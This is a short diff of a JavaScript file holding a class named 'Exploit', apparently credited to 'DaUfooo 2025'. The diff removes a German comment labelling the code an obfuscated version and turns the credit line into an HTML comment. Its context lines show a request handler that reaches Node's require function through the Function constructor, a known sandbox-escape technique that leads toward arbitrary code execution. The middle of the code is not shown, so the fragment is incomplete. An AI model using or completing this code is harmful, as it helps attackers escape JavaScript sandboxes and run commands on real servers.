@@ -1,5 +1,3 @@
-// Verschleierte Version
-
 class Exploit {
   process_incoming_request({ request }) {
     const a = console.log.constructor('return process.mainModule.require')();
@@ -17,4 +15,4 @@ class Exploit {
   }
 }
 
-// By DaUfooo 2025
+<!-- By DaUfooo 2025 -->
